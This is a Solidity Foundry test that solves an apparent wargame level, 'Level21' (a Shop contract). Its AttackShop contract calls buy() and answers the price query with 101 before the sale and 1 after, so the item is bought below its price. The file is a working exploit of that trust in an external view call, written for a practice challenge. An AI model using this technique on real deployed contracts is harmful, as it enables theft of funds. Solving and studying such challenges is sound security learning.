// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level21.sol";
import "forge-std/Test.sol";

contract ExploitLevel21 is Test {
    Shop instance = new Shop();
    AttackShop attackS = new AttackShop(instance);

    function testExploit() external {
        attackS.attack();
        console.log(instance.price());
        console.log(instance.isSold());
    }
}

contract AttackShop {
    Shop instance;

    constructor(Shop _instance) {
        instance = _instance;
    }

    function attack() external {
        instance.buy();
    }

    function price() external view returns (uint256) {
        if (instance.isSold()) {
            return 1;
        }
        return 101;
    }
}
